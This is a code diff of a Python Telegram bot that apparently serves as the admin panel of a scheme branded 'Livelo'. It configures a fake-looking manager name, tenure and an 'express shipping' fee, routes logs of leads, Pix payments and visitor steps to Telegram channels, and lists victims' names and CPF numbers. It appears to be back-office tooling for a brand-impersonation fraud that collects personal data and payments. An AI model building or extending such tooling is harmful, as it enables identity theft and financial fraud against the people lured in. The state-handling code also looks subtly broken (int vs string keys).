@@ -3,160 +3,180 @@ from telebot.types import WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton
 import requests
 import sqlite3
 import os
+import json
 
 # ==========================================
 # CONFIGURACOES DO BOT
 # ==========================================
-BOT_TOKEN      = os.environ.get("BOT_TOKEN",      "SEU_TOKEN_AQUI")
-ADMIN_CHAT_ID  = os.environ.get("ADMIN_CHAT_ID",  "SEU_ID_AQUI")
-BOT_SECRET     = os.environ.get("BOT_SECRET",     "livelo_bot_secret_2026")
+BOT_TOKEN      = os.environ.get("BOT_TOKEN", "SEU_TOKEN_AQUI")
+ADMIN_CHAT_ID  = os.environ.get("ADMIN_CHAT_ID", "SEU_ID_AQUI")
+BOT_SECRET     = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
 BASE_URL       = os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:5050")
 WEBAPP_URL     = f"{BASE_URL}/tg_webapp"
 API_BASE       = BASE_URL
 
-suporte_raw    = os.environ.get("BASIC_ADMIN_IDS", "")
-SUPPORT_ADMINS = [x.strip() for x in suporte_raw.split(",")] if suporte_raw else ["ID_SUPORTE_1"]
-
-bot = telebot.TeleBot(BOT_TOKEN)
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 
 def is_supreme(message):
     return str(message.chat.id) == str(ADMIN_CHAT_ID)
 
-def set_logo_via_api(logo_url):
+def api_call(action, payload=None):
     try:
         r = requests.post(
-            f"{API_BASE}/api/internal/set-logo",
-            json={"logo_url": logo_url},
+            f"{API_BASE}/api/internal/bot-gateway",
+            json={"action": action, "payload": payload or {}},
             headers={"X-Bot-Secret": BOT_SECRET},
-            timeout=8
+            timeout=10
         )
         return r.json()
     except Exception as e:
         return {"ok": False, "error": str(e)}
 
+user_states = {}
+
+# --- MENU INICIAL ---
 @bot.message_handler(commands=["start", "menu", "painel"])
 def send_welcome(message):
+    if not is_supreme(message):
+        bot.send_message(message.chat.id, "Acesso negado.")
+        return
+        
+    bot.set_chat_menu_button(
+        message.chat.id,
+        MenuButtonWebApp(type="web_app", text="Painel Web", web_app=WebAppInfo(url=WEBAPP_URL))
+    )
+    
+    show_main_menu(message.chat.id)
+
+def show_main_menu(chat_id, message_id=None):
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        InlineKeyboardButton("⚙️ Config Gerais", callback_data="menu_config"),
+        InlineKeyboardButton("📢 Canais de Logs", callback_data="menu_logs")
+    )
+    markup.add(
+        InlineKeyboardButton("👥 Leads Recentes", callback_data="menu_leads"),
+        InlineKeyboardButton("💰 Pagamentos", callback_data="menu_pagamentos")
+    )
+    markup.add(
+        InlineKeyboardButton("🌐 Abrir Painel Web", web_app=WebAppInfo(url=WEBAPP_URL))
+    )
+    
+    text = "👑 <b>Painel Supremo Livelo</b>\n\nBem-vindo ao centro de comando. Escolha uma opção abaixo:"
+    
+    if message_id:
+        bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
+    else:
+        bot.send_message(chat_id, text, reply_markup=markup)
+
+# --- CALLBACKS ---
+@bot.callback_query_handler(func=lambda call: True)
+def callback_handler(call):
+    chat_id = call.message.chat.id
+    msg_id = call.message.message_id
+    data = call.data
+    
+    if not str(chat_id) == str(ADMIN_CHAT_ID):
+        bot.answer_callback_query(call.id, "Acesso negado.")
+        return
+
+    if data == "menu_main":
+        user_states.pop(chat_id, None)
+        show_main_menu(chat_id, msg_id)
+        
+    elif data == "menu_config":
+        res = api_call("get_config")
+        cfg = res.get("config", {}) if res.get("ok") else {}
+        
+        markup = InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            InlineKeyboardButton(f"👩‍💼 Nome da Gerente: {cfg.get('mgr_name', 'Não def.')}", callback_data="set_mgr_name"),
+            InlineKeyboardButton(f"📅 Anos de Empresa: {cfg.get('mgr_years', 'Não def.')}", callback_data="set_mgr_years"),
+            InlineKeyboardButton(f"🚚 Valor Frete Expresso: R$ {cfg.get('frete_expresso', '24,90')}", callback_data="set_frete_expresso"),
+            InlineKeyboardButton(f"🖼️ Alterar Logo/Avatar", callback_data="set_avatar"),
+            InlineKeyboardButton("🔙 Voltar", callback_data="menu_main")
+        )
+        bot.edit_message_text("⚙️ <b>Configurações Gerais</b>\nSelecione o que deseja alterar:", chat_id, msg_id, reply_markup=markup)
+
+    elif data == "menu_logs":
+        res = api_call("get_config")
+        cfg = res.get("config", {}) if res.get("ok") else {}
+        
+        markup = InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            InlineKeyboardButton(f"📝 Canal Leads: {cfg.get('tg_log_leads', 'Não def.')}", callback_data="set_log_leads"),
+            InlineKeyboardButton(f"💸 Canal Pix/Pags: {cfg.get('tg_log_pagamentos', 'Não def.')}", callback_data="set_log_pagamentos"),
+            InlineKeyboardButton(f"🚪 Canal Acessos/Etapas: {cfg.get('tg_log_acessos', 'Não def.')}", callback_data="set_log_acessos"),
+            InlineKeyboardButton("🔙 Voltar", callback_data="menu_main")
+        )
+        bot.edit_message_text("📢 <b>Configurar Canais de Log</b>\nInsira o ID do grupo/canal para cada evento:", chat_id, msg_id, reply_markup=markup)
+
+    elif data.startswith("set_"):
+        key_map = {
+            "set_mgr_name": ("mgr_name", "Digite o novo Nome da Gerente:"),
+            "set_mgr_years": ("mgr_years", "Digite a nova quantidade de Anos na Empresa:"),
+            "set_frete_expresso": ("frete_expresso", "Digite o valor do frete (ex: 24,90):"),
+            "set_avatar": ("mgr_avatar", "Envie o LINK da nova logo/avatar (http...):"),
+            "set_log_leads": ("tg_log_leads", "Digite o ID do canal para Logs de Leads Finalizados (-100...):"),
+            "set_log_pagamentos": ("tg_log_pagamentos", "Digite o ID do canal para Logs de Pagamentos (-100...):"),
+            "set_log_acessos": ("tg_log_acessos", "Digite o ID do canal para Logs de Acessos e Etapas (-100...):")
+        }
+        if data in key_map:
+            db_key, prompt = key_map[data]
+            user_states[chat_id] = {"action": "wait_input", "key": db_key, "msg_id": msg_id}
+            
+            markup = InlineKeyboardMarkup()
+            markup.add(InlineKeyboardButton("❌ Cancelar", callback_data="menu_config" if "log" not in data else "menu_logs"))
+            bot.edit_message_text(f"✏️ {prompt}", chat_id, msg_id, reply_markup=markup)
+
+    elif data == "menu_leads":
+        res = api_call("get_leads", {"limit": 5})
+        if res.get("ok"):
+            leads = res.get("leads", [])
+            txt = "👥 <b>Últimos 5 Leads:</b>\n\n"
+            for L in leads:
+                txt += f"👤 <b>{L.get('nome', 'Sem nome')}</b>\nCPF: <code>{L.get('cpf', '-')}</code>\nCartão: {L.get('card_style', '-')}\nStatus: {L.get('pix_status', '-')}\n\n"
+            
+            markup = InlineKeyboardMarkup()
+            markup.add(InlineKeyboardButton("🔙 Voltar", callback_data="menu_main"))
+            bot.edit_message_text(txt if leads else "Nenhum lead ainda.", chat_id, msg_id, reply_markup=markup)
+        else:
+            bot.answer_callback_query(call.id, "Erro ao buscar leads.")
+
+    elif data == "menu_pagamentos":
+        res = api_call("get_payments", {"limit": 5})
+        if res.get("ok"):
+            pags = res.get("payments", [])
+            txt = "💰 <b>Últimos 5 Pagamentos (Tentativas):</b>\n\n"
+            for P in pags:
+                txt += f"💸 R$ {P.get('amount', 0)}\nStatus: {P.get('status', '-')}\nID: <code>{P.get('payment_id', '-')}</code>\n\n"
+            
+            markup = InlineKeyboardMarkup()
+            markup.add(InlineKeyboardButton("🔙 Voltar", callback_data="menu_main"))
+            bot.edit_message_text(txt if pags else "Nenhum pagamento ainda.", chat_id, msg_id, reply_markup=markup)
+        else:
+            bot.answer_callback_query(call.id, "Erro ao buscar pagamentos.")
+
+    bot.answer_callback_query(call.id)
+
+@bot.message_handler(func=lambda m: str(m.chat.id) in user_states and user_states[str(m.chat.id)]["action"] == "wait_input")
+def handle_input(message):
     chat_id = str(message.chat.id)
-    if chat_id == ADMIN_CHAT_ID:
-        bot.set_chat_menu_button(
-            message.chat.id,
-            MenuButtonWebApp(type="web_app", text="Painel Supremo", web_app=WebAppInfo(url=WEBAPP_URL))
-        )
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("👑 Abrir Painel Supremo", web_app=WebAppInfo(url=WEBAPP_URL)))
-        texto = (
-            "👑 *Painel Admin Supremo — Livelo*\n\n"
-            "Acesso total concedido.\n\n"
-            "📋 *Comandos de Logo:*\n"
-            "/logo — Ver instrucoes\n"
-            "/logo\\_url `<link>` — Definir logo por URL\n"
-            "/logo\\_reset — Restaurar logo padrao\n"
-            "/logo\\_atual — Ver logo atual"
-        )
-        bot.send_message(message.chat.id, texto, parse_mode="Markdown", reply_markup=markup)
-    elif chat_id in SUPPORT_ADMINS:
-        bot.set_chat_menu_button(
-            message.chat.id,
-            MenuButtonWebApp(type="web_app", text="Gestao de Leads", web_app=WebAppInfo(url=WEBAPP_URL))
-        )
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("📊 Acessar Gestao de Leads", web_app=WebAppInfo(url=WEBAPP_URL)))
-        bot.send_message(message.chat.id,
-            "🛡️ *Painel de Suporte — Livelo*\n\nAcompanhe os leads em tempo real.",
-            parse_mode="Markdown", reply_markup=markup)
+    state = user_states[chat_id]
+    db_key = state["key"]
+    val = message.text.strip()
+    
+    bot.delete_message(chat_id, message.message_id)
+    
+    res = api_call("set_config", {db_key: val})
+    if res.get("ok"):
+        bot.edit_message_text("✅ Configuração salva com sucesso!", chat_id, state["msg_id"])
     else:
-        bot.send_message(message.chat.id, "Acesso negado.")
-
-@bot.message_handler(commands=["logo"])
-def cmd_logo_help(message):
-    if not is_supreme(message):
-        bot.send_message(message.chat.id, "Acesso negado.")
-        return
-    bot.send_message(message.chat.id,
-        "🎨 *Alterar Logo da Pagina de Leads*\n\n"
-        "1 — Envie uma *foto* diretamente aqui\n"
-        "2 — Use `/logo_url https://link.com/logo.png`\n\n"
-        "Para restaurar o padrao: /logo\\_reset\n"
-        "Para ver a logo atual: /logo\\_atual",
-        parse_mode="Markdown")
-
-@bot.message_handler(commands=["logo_url"])
-def cmd_logo_url(message):
-    if not is_supreme(message):
-        bot.send_message(message.chat.id, "Acesso negado.")
-        return
-    parts = message.text.strip().split(maxsplit=1)
-    if len(parts) < 2 or not parts[1].startswith("http"):
-        bot.send_message(message.chat.id, "Uso: /logo\\_url https://link-da-imagem.com/logo.png", parse_mode="Markdown")
-        return
-    logo_url = parts[1].strip()
-    bot.send_message(message.chat.id, "Atualizando logo...")
-    result = set_logo_via_api(logo_url)
-    if result.get("ok"):
-        bot.send_message(message.chat.id,
-            f"Logo atualizada!\n{logo_url}\n\nTodos os leads verao a nova logo.",
-            parse_mode="Markdown")
-    else:
-        bot.send_message(message.chat.id, f"Erro: {result.get('error', 'desconhecido')}")
-
-@bot.message_handler(content_types=["photo"])
-def handle_photo(message):
-    if not is_supreme(message):
-        return
-    bot.send_message(message.chat.id, "Processando imagem...")
-    photo    = message.photo[-1]
-    file_info = bot.get_file(photo.file_id)
-    file_url  = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
-    try:
-        img_resp = requests.get(file_url, timeout=15)
-        img_resp.raise_for_status()
-        ext  = file_info.file_path.rsplit(".", 1)[-1] if "." in file_info.file_path else "jpg"
-        fname = f"logo_tg_{photo.file_id[:10]}.{ext}"
-        upload = requests.post(
-            f"{API_BASE}/api/internal/set-logo-file",
-            files={"logo_file": (fname, img_resp.content, f"image/{ext}")},
-            headers={"X-Bot-Secret": BOT_SECRET},
-            timeout=15
-        )
-        if upload.status_code == 404:
-            result = set_logo_via_api(file_url)
-        else:
-            result = upload.json()
-        if result.get("ok"):
-            bot.send_message(message.chat.id, "Logo atualizada com sucesso!")
-        else:
-            bot.send_message(message.chat.id, f"Erro: {result.get('error')}")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"Erro: {e}")
-
-@bot.message_handler(commands=["logo_reset"])
-def cmd_logo_reset(message):
-    if not is_supreme(message):
-        bot.send_message(message.chat.id, "Acesso negado.")
-        return
-    result = set_logo_via_api("/static/images/manager_default.svg")
-    if result.get("ok"):
-        bot.send_message(message.chat.id, "Logo restaurada ao padrao Livelo!")
-    else:
-        bot.send_message(message.chat.id, f"Erro: {result.get('error')}")
-
-@bot.message_handler(commands=["logo_atual"])
-def cmd_logo_atual(message):
-    if not is_supreme(message):
-        bot.send_message(message.chat.id, "Acesso negado.")
-        return
-    try:
-        db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "livelo.db")
-        conn = sqlite3.connect(db_path)
-        row  = conn.execute("SELECT value FROM sys_config WHERE key='system_logo_url'").fetchone()
-        conn.close()
-        url = row[0] if row else "(padrao)"
-        bot.send_message(message.chat.id, f"Logo atual:\n{url}")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"Erro: {e}")
+        bot.edit_message_text(f"❌ Erro ao salvar: {res.get('error')}", chat_id, state["msg_id"])
+        
+    del user_states[chat_id]
+    show_main_menu(chat_id)
 
 if __name__ == "__main__":
-    print("Bot Telegram Livelo iniciado.")
-    print(f"  Admin ID : {ADMIN_CHAT_ID}")
-    print(f"  Base URL : {BASE_URL}")
+    print("Bot Telegram Admin 2.0 Iniciado!")
     bot.infinity_polling()
